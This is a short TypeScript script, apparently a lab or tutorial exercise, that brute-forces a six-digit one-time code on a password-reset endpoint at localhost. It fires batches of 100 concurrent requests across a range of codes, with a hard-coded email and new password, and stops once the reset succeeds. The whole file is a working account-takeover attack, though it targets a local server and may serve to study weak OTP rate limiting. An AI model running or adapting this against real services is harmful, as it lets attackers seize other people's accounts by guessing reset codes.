import axios, { AxiosError, AxiosResponse } from 'axios';

async function sendRequest(otp: string): Promise<boolean> {
  const data = JSON.stringify({
    email: 'ishan@gmail.com',
    otp: otp,
    newPassword: 'ishan@2000',
  });

  const config = {
    method: 'post',
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json',
    },
    data: data,
  };

  try {
    const response: AxiosResponse = await axios.request(config);
    if (
      response.status === 200 &&
      response.data.message === 'Password has been reset successfully'
    ) {
      console.log('Success for OTP: ' + otp);
      return true;
    }
  } catch (e) {
    const error = e as AxiosError;
    if (error.response && error.response.status !== 401) {
      console.error('Error for OTP ' + otp + ': ' + error.message);
    }
  }
  return false;
}

async function main(): Promise<void> {
  const startOTP = 640000;
  const endOTP = 650000;
  const batchSize = 100;

  for (let i = startOTP; i < endOTP; i += batchSize) {
    const promises: Promise<boolean>[] = [];
    console.log('Processing batch starting at ' + i);

    for (let j = 0; j < batchSize && i + j < endOTP; j++) {
      const otp = (i + j).toString().padStart(6, '0'); // Ensure 6-digit string OTP
      promises.push(sendRequest(otp));
    }

    const results = await Promise.all(promises);

    if (results.includes(true)) {
      console.log('OTP found in batch starting at ' + i);
      break;
    }

    // Add a small delay between batches to reduce server load
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
}

main().catch((error) => console.error('An unexpected error occurred:', error));
